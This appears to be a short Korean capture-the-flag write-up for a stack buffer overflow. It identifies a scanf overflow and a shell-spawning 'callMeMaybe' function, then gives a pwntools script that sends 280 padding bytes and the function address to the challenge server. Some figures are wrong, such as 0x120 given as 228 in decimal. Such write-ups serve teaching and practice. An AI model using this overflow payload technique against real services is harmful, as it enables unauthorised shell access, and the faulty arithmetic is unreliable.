

풀이

비트수 0x120 		십진수로 228


checksec 를 했을떄

NX : ENABLED

RELRO : FULL		

이기 떄문에 쉘코드와 go 오버라이트가 불가능하다.

바이너리 코드를 뜯어서 해석하면

C로 번역된 코드들이있는데 설명을하자면

char s로 받는 변수 선언

int v5 선언

_isoc99_scanf 로 받는 envp 가 있다. 코드를 보니 scanf 를 통해 버퍼오버플로우 공격을 하면 
될것같은데 보호기법이 적용되어있어 그것마저 여의치않다(쉘코드 삽입 불가)

이제 풀기위해 다른 함수를 찾아보자.

그러면 int callMeMaybe 라는 함수를 발견할수있는데 이코드 내용을보면
이함수를 호출하면 쉘을 불러올수있다 즉 scanf 를 이용하여 이함수를 실행시키면 된다.


코드 내용을 보면 입력하는 0x120  구간 이므로

스택은 0x120 

나머지 rsp , rbp 부분 은 4바이트 ret 부분 4바이트

총 버퍼스택은 280   SFP RET 8바이트

그리고 제일중요한 호출할 함수 주소 0000 0000 0040 0606

이제 코드를 짜보면

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3004)
payload = "A" *280
payload += p64(0x0000000000400606)

p.sendline(payload)
p.interactive()


